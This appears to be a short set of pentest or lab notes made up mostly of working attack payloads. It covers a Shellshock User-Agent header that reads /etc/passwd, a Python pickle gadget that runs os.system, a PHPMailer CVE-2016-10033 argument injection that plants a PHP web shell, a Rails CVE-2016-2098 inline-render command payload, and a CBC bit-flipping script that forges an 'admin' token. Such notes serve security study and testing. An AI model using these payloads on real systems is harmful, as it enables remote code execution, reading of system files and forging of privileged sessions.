# Exploit shellshock

declare an empty function (env variable) in a header (user-agent) and append a command

User-Agent: () { :;};echo;$(</etc/passwd)

Exploit pickle serialization

- Serialisation: object -> data(string)
- Deseralisation: data(string)-> object
- Ruby-Yaml: code dependent
- Python-Pickle: automatic
- PHP-Unserialize: code dependent
- Java-XMLDecoder: automatic
is possible to construct malicious data that will execute arbitrary code during unpickling, never unpickle data that could have come from an unstrusted source, or that could have been tampered with
Consider signing data with hmac if you need validation
Json may be more appropriate if you are processing untrusted data.

Ex:
```python
#The method __reduce__ tells python how to pickle an object
class Blah(object):
	def __reduce__(self):
		return (os.system,("command",))

print pickle.dumps(Blah()) #pyton2
print pickle.dumps(Blah(),2) #python3
```

you need to pickle the object in the same platform

# CVE-2016-10033
The exploitation happens in phpmailer, this issue is done in two steps:

-   Create a file with a PHP extension in the web root of the server.
-   Access the newly created file.

To create the file, you can inject some extra-arguments to the command as part of the email address:

"attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1

This will allow us to create the file `/var/www/shell.php`. To get code execution, we also need to inject a web shell in the email's body:

<?php system($_GET['c']);?>

Finally, you need to access your web shell to execute commands using the `c` parameter.

# CVE-2016-2098

This issue comes from the usage of the `render` method on user-supplied data. The following code illustrates the problem:

class TestController < ApplicationController
  def show
    render params[:id]
  end
end

The method `render` is usually used to render a page from a template like in the following code:

Instead of sending a simple parameter `id=test`, you can build your request to send a hash: `id[inline]=RUBYTEMPLATE`. To gain code execution, you just need to find the right value for `RUBYTEMPLATE` to exec commands. Here you will need to be extra careful with the encoding to get it to work.

PAYLOAD: url/pages?id[inline]=<%25%3D`id`%25>

# Cypher block chaining CBC

```python
from base64 import urlsafe_b64decode, urlsafe_b64encode

from Crypto.Util.Padding import pad

  

def xor(a,b):

    return bytes(x^y for x,y in zip(a,b))

  

ct=urlsafe_b64decode('JYpmSnQT1yCZ0bRwfkCg76dfa9IfR13P')

pt=pad(b'jesus',16)

  

iv=ct[:16]

c1=ct[16:]

  

b1=xor(pt,iv)

pt2=pad(b'admin',16)

iv2=xor(pt2,b1)

ct2=iv2+c1

print(urlsafe_b64encode(ct2))
```

